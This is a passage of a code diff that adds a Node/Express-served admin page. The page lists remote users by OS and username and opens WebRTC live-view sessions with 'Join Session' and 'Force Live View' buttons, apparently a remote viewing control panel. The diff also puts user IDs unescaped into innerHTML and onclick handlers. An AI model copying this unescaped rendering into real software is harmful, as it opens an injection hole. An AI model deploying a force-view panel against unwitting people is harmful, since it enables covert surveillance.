+                session.pc.addIceCandidate(new RTCIceCandidate(candidate))
+                    .catch(err => addLog(\`[WEBRTC] Error adding candidate: \${err.message}\`, 'red'));
+            } else {
+                // Queue candidate if remote description is not yet set
+                session.candidates.push(candidate);
+            }
+        }
+
+        function closeSession(targetId) {
+            if (sessions[targetId]) {
+                if (sessions[targetId].pc) {
+                    sessions[targetId].pc.close();
+                }
+                delete sessions[targetId];
+                addLog(\`[CLOSE] Session closed for \${targetId}\`, 'red');
+            }
+        }
+
+        function addLog(msg, colorClass = '') {
+            const logContainer = document.getElementById('logs-container');
+            const div = document.createElement('div');
+            div.className = \`log-entry log-alert-\${colorClass}\`;
+            const timeSpan = document.createElement('span');
+            timeSpan.className = 'log-time';
+            timeSpan.innerText = new Date().toLocaleTimeString();
+            const msgSpan = document.createElement('span');
+            msgSpan.innerText = msg;
+            div.appendChild(timeSpan);
+            div.appendChild(msgSpan);
+            logContainer.prepend(div);
+            if (logContainer.children.length > 100) {
+                logContainer.removeChild(logContainer.lastChild);
+            }
+        }
+
+        function renderUsers() {
+            const grid = document.getElementById('userGrid');
+            const emptyState = document.getElementById('emptyState');
+            grid.innerHTML = '';
+            const userCount = Object.keys(users).length;
+
+            if (userCount === 0) {
+                emptyState.style.display = 'block';
+                return;
+            } else {
+                emptyState.style.display = 'none';
+            }
+
+            for (const [id, data] of Object.entries(users)) {
+                const card = document.createElement('div');
+                card.className = 'card';
+
+                const osInfo = data.info ? \`\${data.info.os || 'Unknown'} / \${data.info.user || 'Unknown'}\` : 'Unknown OS';
+                const lastSeen = data.lastSeen ? new Date(data.lastSeen).toLocaleTimeString() : 'N/A';
+
+                let statusColor = 'status-offline';
+                let btnText = 'Join Session';
+                let btnClass = '';
+
+                if (data.status === 'Online') {
+                    statusColor = 'status-online';
+                    if (data.sessionActive) {
+                        btnText = 'Reconnect Session';
+                        btnClass = 'active';
+                    }
+                } else if (data.status === 'Connecting...') {
+                    statusColor = 'status-connecting';
+                    btnText = 'Connecting...';
+                }
+
+                card.innerHTML = \`
+                    <strong>User ID: \${id}</strong><br>
+                    <span class="status-dot \${statusColor}"></span> Info: \${osInfo}<br>
+                    Last Seen: \${lastSeen}<br>
+                    <button class="btn \${btnClass}" onclick="joinUser('\${id}', '\${data.status}')">\${btnText}</button>
+                    <button class="btn btn-force" onclick="forceLiveView('\${id}')">📺 Force Live View</button>
+                \`;
+                grid.appendChild(card);
+            }
+        }
+
+        function joinUser(id, status) {
+            // If we have stored signaling data, send it back
+            if (users[id] && users[id].signalingData) {
+                const sigData = users[id].signalingData;
+                ws.send(JSON.stringify({
+                    type: sigData.type,
+                    targetId: id,
+                    sdp: sigData.sdp,
+                    candidate: sigData.candidate
+                }));
+                addLog(\`[ADMIN] Resent \${sigData.type} to \${id}\`, 'green');
+            } else {
+                // Request a new join
+                ws.send(JSON.stringify({
+                    type: 'request_join',
+                    targetId: id,
+                    from: null
+                }));
+                addLog(\`[ADMIN] Requested new join to \${id}\`, 'blue');
+            }
+
+            // Visual feedback
+            const card = document.querySelector(\`button[onclick="joinUser('\${id}', '\${status}')"]\`).parentElement;
+            card.style.borderColor = '#4ade80';
+            setTimeout(() => card.style.borderColor = '#3b82f6', 500);
+        }
+
+        function forceLiveView(id) {
+            addLog(\`[FORCE] Forcing live view for \${id}\`, 'yellow');
+            // Close any existing session for this ID to clear black frames
+            if (sessions[id]) {
+                closeSession(id);
+            }
+            // Request a fresh join
+            ws.send(JSON.stringify({
+                type: 'request_join',
+                targetId: id,
+                from: null
+            }));
+        }
+
+        function forceLiveViewFromFrame() {
+            // Get the current user ID from the active session or last joined
+            // Since we don't store which ID is currently viewing, we'll just force refresh the last active one or the first one
+            const ids = Object.keys(sessions);
+            if(ids.length > 0) {
+                const lastId = ids[ids.length - 1];
+                closeSession(lastId);
+                ws.send(JSON.stringify({
+                    type: 'request_join',
+                    targetId: lastId,
+                    from: null
+                }));
+            }
+        }
+
+        function closeVideo() {
+            document.getElementById('videoModal').style.display = 'none';
+            // Close all active sessions
+            Object.keys(sessions).forEach(sid => closeSession(sid));
+            remoteVideo.srcObject = null;
+        }
+    </script>
+</body>
+</html>
+`;
+
+// Inject the HTML into the server response
+app.get('/admin.html', (req, res) => {
+ res.setHeader('Content-Type', 'text/html');
+ res.send(adminHTML);
 });
